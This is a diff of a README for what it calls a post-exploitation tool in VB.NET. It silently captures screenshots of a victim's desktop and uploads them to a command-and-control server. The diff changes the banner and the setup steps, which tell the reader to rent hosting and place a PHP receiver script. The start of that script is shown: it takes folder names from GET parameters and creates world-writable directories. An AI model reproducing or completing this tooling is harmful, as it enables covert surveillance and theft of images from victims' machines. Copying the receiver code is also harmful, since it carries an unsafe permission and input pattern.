@@ -1,14 +1,5 @@
+# ****Mr Peter :D****
 
-$$\      $$\ $$$$$$$\        $$$$$$$\  $$$$$$$$\ $$$$$$$$\ $$$$$$$$\ $$$$$$$\  
-$$$\    $$$ |$$  __$$\       $$  __$$\ $$  _____|\__$$  __|$$  _____|$$  __$$\ 
-$$$$\  $$$$ |$$ |  $$ |      $$ |  $$ |$$ |         $$ |   $$ |      $$ |  $$ |
-$$\$$\$$ $$ |$$$$$$$  |      $$$$$$$  |$$$$$\       $$ |   $$$$$\    $$$$$$$  |
-$$ \$$$  $$ |$$  __$$<       $$  ____/ $$  __|      $$ |   $$  __|   $$  __$$< 
-$$ |\$  /$$ |$$ |  $$ |      $$ |      $$ |         $$ |   $$ |      $$ |  $$ |
-$$ | \_/ $$ |$$ |  $$ |      $$ |      $$$$$$$$\    $$ |   $$$$$$$$\ $$ |  $$ |
-\__|     \__|\__|  \__|      \__|      \________|   \__|   \________|\__|  \__|
-                                                                               
-                                                                          
 ## Silent Screenshot Capture | Post Exploitation Tool | VB.NET
 
 A simple payload to take the screenshot of victims desktop and upload it to the C&C.
@@ -29,9 +20,9 @@ A simple payload to take the screenshot of victims desktop and upload it to the 
 ## Installation & Usage:
 -   Clone this repository.
 - A webhosting i recommend [namecheap](https://www.namecheap.com/) 
-- Goto your public_html folder and make new php file and put this code in it
+- Goto your public_html folder and make new [PHP](https://en.wikipedia.org/wiki/PHP) file and put below code in it
 ```
-<?php
+    <?php
 $del = $_GET["dellog"];
 $folder = $_GET["folder"];
 mkdir($folder,0777);
